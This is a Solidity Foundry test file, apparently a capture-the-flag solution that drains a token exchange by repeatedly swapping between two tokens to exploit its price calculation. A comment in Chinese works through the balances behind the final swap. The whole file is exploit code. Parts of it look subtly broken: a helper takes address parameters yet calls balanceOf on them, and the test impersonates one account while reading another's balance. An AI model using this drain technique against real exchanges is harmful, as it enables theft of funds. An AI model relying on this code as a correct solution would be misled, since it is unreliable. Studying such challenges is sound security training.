// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";


interface IDex {
    function token1() external returns (address);
    function token2() external returns (address);
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
}

interface ISwappableToken {
    function approve(address owner, address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract DexTest is BaseTest {

    function test_Attack() public {
        ISwappableToken token1 = ISwappableToken(IDex(contractAddress).token1());
        ISwappableToken token2 = ISwappableToken(IDex(contractAddress).token2());
        vm.startPrank(deployer);

        token1.approve(contractAddress, 200);
        token2.approve(contractAddress, 200);

        // To drain the dex our goal is to make the balance of `tokenIn` much lower compared to balance of tokenOut
        attackSwap(token1, token2);
        attackSwap(token2, token1);
        attackSwap(token1, token2);
        attackSwap(token2, token1);
        attackSwap(token1, token2);
        /* 
            在所有这些交换之后，当前情况如下：
            token1 余额 -> 0
            token2 余额 -> 65
            Dex token1 余额 -> 110
            Dex token2 余额 -> 45
            如果交换所有的 65 个 token2，将得到 158 个 token1，交易会失败
            110 = token2 数量 * 110 / 45
            token2 数量 = 45
         */
        IDex(contractAddress).swap(address(token2), address(token1), 45);

        assertEq(token1.balanceOf(contractAddress) == 0 || token2.balanceOf(contractAddress) == 0, true);

        vm.stopPrank();
    }

    function attackSwap(address tokenIn, address tokenOut) internal {
        IDex(contractAddress).swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(player));
    }
}